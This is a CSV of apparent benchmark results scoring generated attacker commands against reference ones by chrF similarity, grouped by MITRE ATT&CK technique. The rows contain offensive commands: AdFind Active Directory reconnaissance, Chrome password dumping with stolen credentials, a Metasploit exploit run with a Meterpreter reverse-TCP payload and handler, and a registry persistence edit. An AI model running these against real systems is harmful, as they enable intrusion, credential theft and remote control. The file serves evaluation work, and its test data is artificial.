file,tool,input_command,matched_command,chrf_score,match_found
command_adfind_TA0007_T1016.txt,adfind,adfind -sc sitedmp,"adfind -f ""(objectcategory=group)""`",30.237,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc sitelinkdmp:<site_name>,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,21.623,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc subnetdmp,`adfind.exe -subnets -f (objectcategory=subnet) > ad_subnets.txt`,31.629,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc gpodmp,"adfind -f ""(objectcategory=group)""`",30.75,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc fspdmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,30.316,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc oudmp,"adfind -f ""(objectcategory=group)""`",33.311,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc dcdmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,31.649,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc fo:<object_name>,"adfind -f ""(objectcategory=group)""`",35.485,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc kids:<dn>,"adfind -f ""(objectcategory=group)""`",24.477,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc u:<user_name>,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,25.271,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc userinfo:<user_name>,`adfind.exe -f (objectcategory=person) > ad_users.txt`,23.352,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc g:<group_name>,"adfind -f ""(objectcategory=group)""`",32.799,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sc c:<computer_name>,`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,34.636,True
command_adfind_TA0007_T1016.txt,adfind,adfind -daclpipe+ <object_dn>,"adfind -f ""(objectcategory=group)""`",32.742,True
command_adfind_TA0007_T1016.txt,adfind,adfind -sddlpsflag <object_dn>,"adfind -f ""(objectcategory=group)""`",31.778,True
command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",60.523,True
command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_username> <stolen_password>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",32.517,True
command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_username> <stolen_password> -f <victim_chrome_profile_path>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",23.313,True
command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_username> <stolen_password> -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",31.512,True
command_chrome_passwords_TA0007_T1087.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",59.855,True
command_metasploit_TA0001_T1190.txt,metasploit,"msfconsole -x ""use exploit/multi/http/... ; set RHOST 192.168.0.4 ; set RPORT 80 ; set PAYLOAD windows/meterpreter/reverse_tcp ; run""","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```",48.903,True
command_metasploit_TA0003_T1543.txt,metasploit,"meterpreter > reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows"" /v ""RandomServiceName"" /t REG_SZ /d ""<random_service_name>""","    ```
    set CMD ""reg.exe delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Java-Update /f""
    exploit
    ```",23.054,True
